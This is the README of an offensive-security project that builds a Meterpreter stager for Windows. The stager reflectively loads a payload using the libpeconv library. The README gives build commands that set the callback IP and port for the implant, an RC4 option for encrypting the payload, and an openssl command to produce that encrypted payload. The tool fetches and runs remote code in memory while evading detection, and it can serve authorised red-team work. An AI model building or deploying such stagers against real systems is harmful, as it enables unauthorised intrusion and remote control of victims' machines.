# stager_libpeconv
A basic meterpreter protocol stager using the libpeconv library by hasherezade for reflective loading

Don't forget to include submodules (actually libpeconv) while checking out:

```
git clone --recurse-submodules https://github.com/tothi/stager_libpeconv
```

Compiling should work on Linux (with [mingw-w64](https://www.mingw-w64.org/)
cross-compiler toolset installed) using the provided [Makefile](./Makefile)
(config params for make are mandatory):

```
make stager IMPLANT_IP=192.168.56.1 IMPLANT_PORT=8889
```

The stager.exe binary output is built into the [dist](./dist) folder.

For basic RC4 payload encryption support, compile by configuring the key:

```
make stager IMPLANT_IP=192.168.56.1 IMPLANT_PORT=8889 RC4_KEY=1234567890123456
```

Currently only 16-char keys are supported (still no built-in padding).

For generating encrypted payload, you may use openssl (1.1):

```
openssl-1.1 enc -rc4 -in payload.exe -K `echo -n '1234567890123456' | xxd -p` -nosalt -out payload.bin
```
